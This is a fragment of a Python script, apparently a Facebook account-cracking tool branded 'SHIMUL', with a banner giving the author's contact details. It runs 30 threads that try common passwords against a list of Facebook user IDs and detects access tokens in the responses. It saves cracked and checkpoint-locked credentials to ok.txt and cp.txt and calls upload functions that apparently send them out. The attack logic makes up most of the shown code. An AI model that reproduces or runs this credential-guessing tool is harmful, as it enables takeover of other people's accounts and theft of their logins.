...
class Main:
	def __init__(self):
		...
		self.loop = 0
		os.system("clear")
		os.system (" xdg-open https://t.me/AnonymousCyberShield")
		os.system (" xdg-open https://t.me/AnonymousCyberShield")
		os.system (" xdg-open https://t.me/AnonymousCyberShield")
		print ("""\033[1;91m		
   _____ __    _                 __
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
 \033[1;92m➣ \033[1;92mDEVOLPER   :            Shimul
\033[1;91m➣ \033[1;92mFACEBOOK   :             MD Shimul
\033[1;93m➣ \033[1;92mWHATSAPP   :            01975549322
\033[1;96m➣ \033[1;92mGITHUB     :            MRSH4MUL
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
	...
	def email(self):
		...
		try:
			...
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SHIMUL "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [SHIMUL] : \033[0;97m %s/%s -> \033[0;92m [SHIMUL -OK:%s ]- \033[0;93m[SHIMUL-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
    ...
    'viewport-width': '980',
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SHIMUL-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [SHIMUL-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[SHIMUL-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SHIMUL-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
